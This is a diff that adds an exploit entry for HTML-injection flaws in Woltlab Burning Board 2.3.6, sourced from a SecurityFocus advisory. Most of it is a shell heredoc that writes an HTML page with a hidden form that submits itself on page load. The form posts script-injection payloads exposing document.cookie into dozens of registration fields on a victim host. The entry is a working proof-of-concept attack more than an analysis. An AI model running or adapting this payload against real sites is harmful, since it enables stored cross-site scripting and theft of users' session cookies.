@@ -1,0 +1,110 @@
+source: http://www.securityfocus.com/bid/22796/info
+
+Woltlab Burning Board is prone to multiple HTML-injection vulnerabilities because it fails to sufficiently sanitize user-supplied input data.
+
+Exploiting these issues may allow an attacker to execute HTML and script code in the context of the affected site, to steal cookie-based authentication credentials, or to control how the site is rendered to the user; other attacks are also possible.
+
+Version 2.3.6 is vulnerable; other versions may also be affected. 
+
+cat <<EOF > wetpussy.html
+<form name='evilform' method='POST'
+action='http://victimhost/wbb2/register.php'>
+<input type=hidden name=r_username value='"><script>alert("Cookie: " +
+document.cookie)</script><lol="'>
+<input type=hidden name=r_email value='"><script>alert("Cookie: " +
+document.cookie)</script><lol="'>
+<input type=hidden name=r_password value='"><script>alert("Cookie: " +
+document.cookie)</script><lol="'>
+<input type=hidden name=r_confirmpassword value='"><script>alert("Cookie: " +
+document.cookie)</script><lol="'>
+<input type=hidden name=key_string value='"><script>alert("Cookie: " +
+document.cookie)</script><lol="'>
+<input type=hidden name=key_number value='"><script>alert("Cookie: " +
+document.cookie)</script><lol="'>
+<input type=hidden name=r_homepage value='"><script>alert("Cookie: " +
+document.cookie)</script><lol="'>
+<input type=hidden name=r_icq value='"><script>alert("Cookie: " +
+document.cookie)</script><lol="'>
+<input type=hidden name=r_aim value='"><script>alert("Cookie: " +
+document.cookie)</script><lol="'>
+<input type=hidden name=r_yim value='"><script>alert("Cookie: " +
+document.cookie)</script><lol="'>
+<input type=hidden name=r_msn value='"><script>alert("Cookie: " +
+document.cookie)</script><lol="'>
+<input type=hidden name=r_day value='"><script>alert("Cookie: " +
+document.cookie)</script><lol="'>
+<input type=hidden name=r_month value='"><script>alert("Cookie: " +
+document.cookie)</script><lol="'>
+<input type=hidden name=r_year value='"><script>alert("Cookie: " +
+document.cookie)</script><lol="'>
+<input type=hidden name=r_gender value='"><script>alert("Cookie: " +
+document.cookie)</script><lol="'>
+<input type=hidden name=r_signature value='"><script>alert("Cookie: " +
+document.cookie)</script><lol="'>
+<input type=hidden name=disablesmilies value='"><script>alert("Cookie: " +
+document.cookie)</script><lol="'>
+<input type=hidden name=disablebbcode value='"><script>alert("Cookie: " +
+document.cookie)</script><lol="'>
+<input type=hidden name=disableimages value='"><script>alert("Cookie: " +
+document.cookie)</script><lol="'>
+<input type=hidden name=r_usertext value='"><script>alert("Cookie: " +
+document.cookie)</script><lol="'>
+<input type=hidden name=field%5B1%5D value='"><script>alert("Cookie: " +
+document.cookie)</script><lol="'>
+<input type=hidden name=field%5B2%5D value='"><script>alert("Cookie: " +
+document.cookie)</script><lol="'>
+<input type=hidden name=field%5B3%5D value='"><script>alert("Cookie: " +
+document.cookie)</script><lol="'>
+<input type=hidden name=r_invisible value='"><script>alert("Cookie: " +
+document.cookie)</script><lol="'>
+<input type=hidden name=r_usecookies value='"><script>alert("Cookie: " +
+document.cookie)</script><lol="'>
+<input type=hidden name=r_admincanemail value='"><script>alert("Cookie: " +
+document.cookie)</script><lol="'>
+<input type=hidden name=r_showemail value='"><script>alert("Cookie: " +
+document.cookie)</script><lol="'>
+<input type=hidden name=r_usercanemail value='"><script>alert("Cookie: " +
+document.cookie)</script><lol="'>
+<input type=hidden name=r_emailnotify value='"><script>alert("Cookie: " +
+document.cookie)</script><lol="'>
+<input type=hidden name=r_notificationperpm value='"><script>alert("Cookie: " +
+document.cookie)</script><lol="'>
+<input type=hidden name=r_receivepm value='"><script>alert("Cookie: " +
+document.cookie)</script><lol="'>
+<input type=hidden name=r_emailonpm value='"><script>alert("Cookie: " +
+document.cookie)</script><lol="'>
+<input type=hidden name=r_pmpopup value='"><script>alert("Cookie: " +
+document.cookie)</script><lol="'>
+<input type=hidden name=r_showsignatures value='"><script>alert("Cookie: " +
+document.cookie)</script><lol="'>
+<input type=hidden name=r_showavatars value='"><script>alert("Cookie: " +
+document.cookie)</script><lol="'>
+<input type=hidden name=r_showimages value='"><script>alert("Cookie: " +
+document.cookie)</script><lol="'>
+<input type=hidden name=r_daysprune value='"><script>alert("Cookie: " +
+document.cookie)</script><lol="'>
+<input type=hidden name=r_umaxposts value='"><script>alert("Cookie: " +
+document.cookie)</script><lol="'>
+<input type=hidden name=r_threadview value='"><script>alert("Cookie: " +
+document.cookie)</script><lol="'>
+<input type=hidden name=r_dateformat value='"><script>alert("Cookie: " +
+document.cookie)</script><lol="'>
+<input type=hidden name=r_timeformat value='"><script>alert("Cookie: " +
+document.cookie)</script><lol="'>
+<input type=hidden name=r_startweek value='"><script>alert("Cookie: " +
+document.cookie)</script><lol="'>
+<input type=hidden name=r_timezoneoffset value='"><script>alert("Cookie: " +
+document.cookie)</script><lol="'>
+<input type=hidden name=r_usewysiwyg value='"><script>alert("Cookie: " +
+document.cookie)</script><lol="'>
+<input type=hidden name=r_styleid value='"><script>alert("Cookie: " +
+document.cookie)</script><lol="'>
+<input type=hidden name=r_langid value='"><script>alert("Cookie: " +
+document.cookie)</script><lol="'>
+<input type=hidden name=send value='send'>
+<input type=hidden name=sid value=''>
+<input type=hidden name=disclaimer value='viewed'>
+</form>
+<body onload=javascript:document.forms['evilform'].submit();>
+EOF
+
